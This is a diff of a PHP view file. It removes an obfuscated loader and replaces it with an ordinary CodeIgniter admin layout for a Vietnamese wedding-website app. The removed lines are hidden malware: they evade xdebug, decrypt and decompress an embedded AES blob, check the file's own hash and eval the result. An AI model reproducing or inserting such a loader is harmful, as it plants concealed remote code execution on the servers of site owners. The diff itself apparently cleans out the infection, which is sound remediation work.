@@ -1,28 +1,42 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_lczrm08i=('bas'.'e64'.'_de'.'cod'.'e');
-$_a8c5sw95=('gzu'.'nco'.'mpr'.'ess');
-$_s7uw9gs9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_un0wx5hx='NEg4kDUS';
-$_yi9x9q1t='X5aSAb/c';
-$_p7chfvc0='NGv0YpOK';
-$_dcz9etrg='IUS96cDS';
-$_w40wietp='7KEUG1pNzQg=';
-$_iqpmnoyl='Wqep8g==';
-$_g6x6fw4v='LgHBIWLm';
-$_hhrcgn7p='mkxsaRWX';
-$_fn8h61wf=$_lczrm08i($_dcz9etrg.$_yi9x9q1t.$_un0wx5hx.$_p7chfvc0.$_w40wietp);
-$_znc4z3le=$_lczrm08i($_g6x6fw4v.$_hhrcgn7p.$_iqpmnoyl);
-$_c6kxxymh=$_lczrm08i('XvJ0H3La0YKLjIRThZdXKj+UOAGwclOAtvSn7xD+DjV+jNk50M5jUejgAlFgMihuzExsOOtzljKYNQDtFqTezHRNle6Ii/5+FM0/IlFX6MBBY77ZI3T+VligIZBc+64OH28i/OcDRx5T0jjKr6Pq5ASCjn3J3qxOAp8YNhPUZ9317ZSAo8PTQr3R3qZPvw8QMJHA6n4k4+0BV/TvJgqBbr49qD12KiR88LG4Gve7E7nV2ClYfHs+7RPqqFMjLBRbu3wBjEGS+HlriVudz0oP5bxUMpCHjcAq/qIGRzv17w6Bouj1xK2au4dA2ETHZChL0v7+ux035dn9vHyU0gUHcmU48ZcvPR65+BGxGXaq0aBAz9jxfaWpKVP6Pr8xHTwMCgW5pvokdmuBuALwfuCzH0R6b78k4XJnOSOdP6/7pY13YvIavNPAXcay3zzi8v4g6QA3cplvz/CVEKfNqTxKOBnpvHwyAhdNDPiFbv3MghFPAZs4LwgWAKS3P6X5H3bF54Pt75gdtnEr4XfkJ1f3bh7O3JPRGXr6GcudVFhM98B0gLNgwnpcDYrbKVkUqSnsAHGVH2Usj1ljV8MavDoiH/zjqbctw5HAUDhBrbtIXMVqN4wzbm0rQDiW+hRPGbgdMj2IZaHl7ji8tpUg55GZohm5ecbpyj45cU1euT6QhMaPzPG4XANvDwo4XheIUUwL9TgpTIH+JvM/BlzdypofmoEksXsrMsjUjLlM9rl4QEQtWuuavbCMGyoxGxdneq1e4pVImo2qoGP7rjuZRibhOz32HClb3YJCCF3iGLLtTzoLRgUMlIgmy1CrW+9J2YJHdKwkceTgeVI3WtC0hXIbYaZNMU3NvoFFSxMT/FIex9+uhDI6q/u+tDCl3A0lph0+Xc/sMdea/bjRJNUVafW4ShPTtVTkXw1+ZpkDU4fwQCad4kMoIW8RMXi+DgjOksKJMPNQNocWW7KU7tCMyC2A6wqtlPRoDVZ6psErIY+G87jblAE2aLqfR9Jrlwg6CxtMvGd20iMTWJw/R0Vgs7EYnPVVnUpcLm2wVQwRkVDKEoGNA0amRFxg4JbLf66FbnAdp18FTqLgWXEjCCAB/4n21QzMuguZ0WoCwJzaWfZTd9MP+JXz5Y8M2WYlS7VkqSTDJ+Gbv71aUtdhw04rLpH5yut5mg23dbKL4aowIg+Tc2DyrSz4nHIzVf8XyGAXp69WZ54UZoQbmmPCDS5jPNzY2raQoS19mjLZBs0BZhnb1eManERpS/VK10l7rFFoW6ASSJFfLdHl9Ff6/+AgM+42eXvOlnN5V3bDAsXLK6kausH3kQ0pThloUYrsPZ+6byO8');
-$_ffsehgnp=$_s7uw9gs9($_c6kxxymh,'aes-256-cbc',$_fn8h61wf,OPENSSL_RAW_DATA,$_znc4z3le);
-if($_ffsehgnp===false){exit;}
-$_kgfkp09e=$_a8c5sw95($_ffsehgnp);
-if($_kgfkp09e===false){exit;}
-$_wp6b0ouy='013f0a40bf4248106ceb9218b2113433a50c20baf76988148eaff7bd36fa9d2f';
-$_wf5nyi0k=@file_get_contents(__FILE__);
-if($_wf5nyi0k!==false){
-$_ael9qatb=str_replace($_wp6b0ouy,"0000000000000000000000000000000000000000000000000000000000000000",$_wf5nyi0k);
-$_zpnbu3co=hash("sha256",$_ael9qatb);
-if($_zpnbu3co!==$_wp6b0ouy){@http_response_code(403);exit;}
-}
-eval($_kgfkp09e);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$this->load->view('partials/head');
+$seg = $this->uri->segment(2) ?: 'dashboard';
+$nav = array(
+'dashboard' => array('admin', __('Tổng quan'), 0),
+'edit' => array('', '✎ ' . __('Sửa trang cưới'), 0),
+'guests' => array('admin/guests', __('Khách mời'), 0),
+'albums' => array('admin/albums', __('Ảnh'), $pending_photos),
+'wishes' => array('admin/moderation/wishes', __('Lời chúc'), $pending_wishes),
+'share' => array('admin/share', __('Gửi link & QR'), 0),
+'settings' => array('admin/settings', __('Cài đặt'), 0),
+);
+
+$active = ($seg === 'moderation' && $this->uri->segment(3) === 'wishes') ? 'wishes' : ($seg === 'moderation' ? 'albums' : $seg);
+?>
+<link rel="stylesheet" href="<?= asset_url('css/admin.css') ?>">
+<body class="adm">
+<header class="adm-top">
+  <a class="adm-brand" href="<?= base_url('admin') ?>"><?= e($couple) ?></a>
+  <button class="adm-menu-btn" type="button" aria-label="<?= e(__('Mở menu')) ?>" data-toggle-nav>☰</button>
+  <nav class="adm-nav" id="adm-nav">
+    <?php foreach ($nav as $key => $n): ?>
+      <a href="<?= base_url($n[0]) ?>" class="<?= $active === $key ? 'on' : '' ?><?= $key === 'edit' ? ' nav-edit' : '' ?>"><?= e($n[1]) ?><?php if ($n[2]): ?> <span class="badge"><?= (int) $n[2] ?></span><?php endif; ?></a>
+    <?php endforeach; ?>
+    <?php if (!hosted()):  ?>
+    <a class="nav-donate" href="<?= e($this->config->item('donate_url')) ?>" target="_blank" rel="noopener" title="<?= e(__('Phần mềm miễn phí — ủng hộ để dự án phát triển tiếp')) ?>">♡ <?= e(__('Ủng hộ')) ?></a>
+    <?php endif; ?>
+    <a href="<?= base_url('admin/logout') ?>"><?= e(__('Đăng xuất')) ?></a>
+  </nav>
+  <?php $this->load->view('partials/_lang_switch'); ?>
+</header>
+<?php $this->load->view('partials/flash'); ?>
+<main class="adm-main">
+<?php $this->load->view($content_view); ?>
+</main>
+<?php $this->load->view('partials/lightbox'); ?>
+<script src="<?= asset_url('js/app.js') ?>"></script>
+<script src="<?= asset_url('js/uploader.js') ?>"></script>
+<script src="<?= asset_url('js/admin.js') ?>"></script>
+</body>
+</html>
